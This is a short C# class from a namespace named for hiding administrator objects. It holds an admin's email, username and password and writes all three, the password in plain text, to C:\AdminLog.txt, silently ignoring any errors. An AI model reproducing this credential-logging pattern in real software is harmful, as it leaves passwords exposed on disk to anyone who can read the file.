using System;
using System.Web.Script.Serialization;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace AdminObjectsHide.HiddenAdminObjects
{
    public class MapAdminObj
    {
        public string Email { get; set; }
        public string UserName { get; set; }
        public String Password { get; set; }
        public int x { get; set; } = 0;
       
        public int saveInText()
        {
            try
            {
                string[] lines = { Email, UserName, Password };
                using (System.IO.StreamWriter file =
                new System.IO.StreamWriter(@"C:\AdminLog.txt"))
                {
                    foreach (string line in lines)
                    {
                        file.WriteLine(line);
                    }
                    x++;
                    return x;
                }

            }
            catch (Exception)
            {
            }
          return 0;
        }
    }
}
